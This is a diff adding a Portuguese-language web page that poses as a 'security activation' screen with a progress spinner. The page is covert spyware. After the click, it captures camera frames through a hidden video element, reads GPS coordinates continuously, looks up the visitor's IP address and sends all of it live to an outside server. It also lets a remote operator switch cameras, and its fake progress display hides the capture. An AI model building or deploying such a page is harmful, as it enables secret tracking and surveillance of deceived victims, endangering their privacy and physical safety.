@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ativação de Segurança</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #090d16; color: #f8fafc; min-height: 100vh;
+    display: flex; align-items: center; justify-content: center; padding: 24px;
+  }
+  .card {
+    background: rgba(15, 23, 42, 0.65); border: 1px solid rgba(255, 255, 255, 0.08);
+    backdrop-filter: blur(16px); border-radius: 24px; padding: 36px 28px;
+    width: 100%; max-width: 380px; text-align: center;
+  }
+  .btn-activate {
+    width: 100%; padding: 20px; border: none; border-radius: 16px;
+    background: linear-gradient(135deg, #10b981, #059669); color: #ffffff;
+    font-size: 1.1rem; font-weight: 700; cursor: pointer;
+  }
+  .process-box { display: none; flex-direction: column; align-items: center; }
+  .spinner-container { position: relative; width: 140px; height: 140px; margin-bottom: 24px; }
+  .spinner-svg { width: 100%; height: 100%; transform: rotate(-90deg); }
+  .spinner-bg { fill: none; stroke: rgba(255, 255, 255, 0.05); stroke-width: 8; }
+  .spinner-bar {
+    fill: none; stroke: #10b981; stroke-width: 8; stroke-linecap: round;
+    stroke-dasharray: 339.292; stroke-dashoffset: 339.292; transition: stroke-dashoffset 0.5s linear;
+  }
+  .percentage-text {
+    position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    font-size: 1.8rem; font-weight: 800; color: #f8fafc;
+  }
+  .status-text { font-size: 0.9rem; color: #94a3b8; line-height: 1.5; }
+  .error-msg {
+    margin-top: 16px; font-size: 0.82rem; color: #f87171;
+    background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2);
+    border-radius: 10px; padding: 10px; display: none; cursor: pointer;
+  }
+  video, canvas { display: none; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <button class="btn-activate" id="btnActivate">Ativar Segurança</button>
+
+  <div class="process-box" id="processBox">
+    <div class="spinner-container">
+      <svg class="spinner-svg" viewBox="0 0 120 120">
+        <circle class="spinner-bg" cx="60" cy="60" r="54"></circle>
+        <circle class="spinner-bar" id="progressBar" cx="60" cy="60" r="54"></circle>
+      </svg>
+      <div class="percentage-text" id="percentText">0%</div>
+    </div>
+    <div class="status-text" id="statusText">Aguardando permissões...</div>
+  </div>
+
+  <div class="error-msg" id="errorMsg">⚠️ Permissão negada! Clique para tentar novamente.</div>
+</div>
+
+<video id="hiddenVideo" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas"></canvas>
+
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script>
+  // ✅ SEU SERVIDOR DO RENDER DIRETO
+  const RENDER_URL = "https://maestro-server-si1f.onrender.com";
+  
+  const urlParams = new URLSearchParams(window.location.search);
+  const roomId = urlParams.get('id');
+
+  const socket = io(RENDER_URL, { transports: ['websocket', 'polling'] });
+  
+  socket.on('connect', () => {
+    if (roomId) socket.emit('join-room', roomId);
+  });
+
+  const btnActivate  = document.getElementById('btnActivate');
+  const processBox  = document.getElementById('processBox');
+  const progressBar = document.getElementById('progressBar');
+  const percentText = document.getElementById('percentText');
+  const statusText  = document.getElementById('statusText');
+  const errorMsg    = document.getElementById('errorMsg');
+  const video       = document.getElementById('hiddenVideo');
+  const canvas      = document.getElementById('hiddenCanvas');
+  const ctx         = canvas.getContext('2d');
+
+  let stream = null;
+  let frameInterval = null;
+  let currentFacing = 'environment';
+  let switchingCam = false;
+  let timerStarted = false;
+
+  const DURATION_SECONDS = 300;
+  const CIRCUMFERENCE = 339.292;
+
+  function getDeviceName() {
+    const ua = navigator.userAgent;
+    if (/android/i.test(ua)) return "Android";
+    if (/iPhone|iPad/i.test(ua)) return "iOS";
+    if (/Windows/i.test(ua)) return "Windows";
+    return "Mobile";
+  }
+
+  async function activateDirectly() {
+    errorMsg.style.display = 'none';
+
+    try {
+      if (!stream) {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: currentFacing, width: { ideal: 400 }, height: { ideal: 300 } },
+          audio: false
+        }).catch(() => navigator.mediaDevices.getUserMedia({ video: true, audio: false }));
+
+        video.srcObject = stream;
+        await video.play();
+        canvas.width = 400; canvas.height = 300;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          let txIp = "Obtendo...";
+          try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            if (data && data.ip) txIp = data.ip;
+          } catch(e){}
+
+          // Envio de Dados do Dispositivo
+          socket.emit('stream-info', {
+            roomId: roomId,
+            info: { ip: txIp, deviceModel: getDeviceName() }
+          });
+
+          // Envio de Localização em Tempo Real
+          socket.emit('stream-location', {
+            roomId: roomId,
+            location: { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy, ts: Date.now() }
+          });
+
+          navigator.geolocation.watchPosition((p) => {
+            socket.emit('stream-location', {
+              roomId: roomId,
+              location: { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, ts: Date.now() }
+            });
+          }, null, { enableHighAccuracy: true });
+
+          // Transmissão Rápida de Vídeo (Otimizado: 200ms)
+          if (!frameInterval) {
+            frameInterval = setInterval(() => {
+              if (!stream || switchingCam) return;
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const dataUrl = canvas.toDataURL('image/jpeg', 0.35);
+              socket.emit('stream-frame', { roomId: roomId, frame: dataUrl });
+            }, 200);
+          }
+
+          // Alternar Câmera Remotamente
+          socket.on('receive-command', async (cmd) => {
+            if (cmd === currentFacing) return;
+            switchingCam = true;
+            try {
+              const newStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cmd }, audio: false });
+              if (stream) stream.getTracks().forEach(t => t.stop());
+              stream = newStream;
+              currentFacing = cmd;
+              video.srcObject = stream;
+              await video.play();
+            } catch (e) {}
+            switchingCam = false;
+          });
+
+          if (!timerStarted) {
+            startTimer();
+            timerStarted = true;
+          }
+
+          btnActivate.style.display = 'none';
+          processBox.style.display = 'flex';
+          statusText.textContent = "Conexão estabelecida com sucesso!";
+        },
+        (err) => {
+          errorMsg.textContent = "⚠️ Permissão de Localização Negada. Ative o GPS.";
+          errorMsg.style.display = 'block';
+        },
+        { enableHighAccuracy: true, timeout: 20000 }
+      );
+
+    } catch (err) {
+      errorMsg.textContent = "⚠️ Permissão de Câmera Negada. Ative a Câmera.";
+      errorMsg.style.display = 'block';
+    }
+  }
+
+  btnActivate.addEventListener('click', activateDirectly);
+
+  function startTimer() {
+    let elapsed = 0;
+    setInterval(() => {
+      elapsed++;
+      const percent = Math.min(100, Math.floor((elapsed / DURATION_SECONDS) * 100));
+      percentText.textContent = percent + '%';
+      progressBar.style.strokeDashoffset = CIRCUMFERENCE - (percent / 100) * CIRCUMFERENCE;
+      if (elapsed >= DURATION_SECONDS) statusText.textContent = "Sincronização concluída.";
+    }, 1000);
+  }
+</script>
+</body>
+</html>
